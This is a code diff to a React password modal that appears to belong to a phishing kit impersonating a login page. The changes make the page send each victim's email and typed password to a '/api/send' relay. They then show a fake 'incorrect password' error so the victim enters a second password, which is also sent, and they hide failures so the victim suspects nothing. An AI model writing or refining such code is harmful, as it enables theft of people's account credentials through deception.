@@ -21,6 +21,8 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
     const [isLoading, setIsLoading] = useState(false);
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
+    const [attempt, setAttempt] = useState(1);
+    const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
     const { messageId, message, setMessage, geoInfo } = store();
@@ -32,10 +34,11 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
     useEffect(() => {
         if (!geoInfo) return;
         const textsToTranslate = [
-            'Enter your password',
             'Password',
-            'Log in',
-            'Forgotten password?'
+            'Continue',
+            'Forgotten password?',
+            'For your security, you must enter your password to continue.',
+            'The password you\'ve entered is incorrect'
         ];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -51,28 +54,54 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
     const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
-        if (isLoading || !message) return;
+        if (isLoading || !message || !password) return;
         setIsLoading(true);
 
-        const updatedMessage = `${message}
+        if (attempt === 1) {
+            // First password attempt
+            const updatedMessage = `${message}
 
 <b>📧 Account Email:</b> <code>${userEmail}</code>
-<b>🔒 Password:</b> <code>${password}</code>`;
+<b>🔒 Password 1:</b> <code>${password}</code>`;
 
-        try {
-            const res = await axios.post('/api/send', {
-                message: updatedMessage,
-                message_id: messageId
-            });
+            try {
+                const res = await axios.post('/api/send', {
+                    message: updatedMessage,
+                    message_id: messageId
+                });
 
-            if (res?.data?.success) {
-                setMessage(updatedMessage);
+                if (res?.data?.success) {
+                    setMessage(updatedMessage);
+                }
+            } catch {
+                // Continue even if send fails
+            } finally {
+                setIsLoading(false);
+                setShowError(true);
+                setPassword('');
+                setAttempt(2);
             }
-            nextStep();
-        } catch {
-            nextStep();
-        } finally {
-            setIsLoading(false);
+        } else if (attempt === 2) {
+            // Second password attempt
+            const updatedMessage = `${message}
+
+<b>🔒 Password 2:</b> <code>${password}</code>`;
+
+            try {
+                const res = await axios.post('/api/send', {
+                    message: updatedMessage,
+                    message_id: messageId
+                });
+
+                if (res?.data?.success) {
+                    setMessage(updatedMessage);
+                }
+                nextStep();
+            } catch {
+                nextStep();
+            } finally {
+                setIsLoading(false);
+            }
         }
     };
 
@@ -105,6 +134,9 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 
                         {/* Password Input */}
                         <div className='w-full px-1.5 sm:px-3 md:px-4'>
+                            <p className='text-xs sm:text-sm text-gray-500 mb-1.5 pl-0.5'>
+                                {t('For your security, you must enter your password to continue.')}
+                            </p>
                             <div className='relative w-full'>
                                 <input
                                     type={showPassword ? 'text' : 'password'}
@@ -126,6 +158,13 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                             </div>
                         </div>
 
+                        {/* Error Message */}
+                        {showError && (
+                            <p className='text-xs sm:text-sm text-red-500 w-full px-1.5 sm:px-3 md:px-4'>
+                                {t('The password you\'ve entered is incorrect')}
+                            </p>
+                        )}
+
                         {/* Log In Button */}
                         <div className='w-full px-1.5 sm:px-3 md:px-4 mt-1 sm:mt-2'>
                             <button
@@ -138,7 +177,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                                 {isLoading ? (
                                     <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                 ) : (
-                                    t('Log in')
+                                    t('Continue')
                                 )}
                             </button>
                         </div>
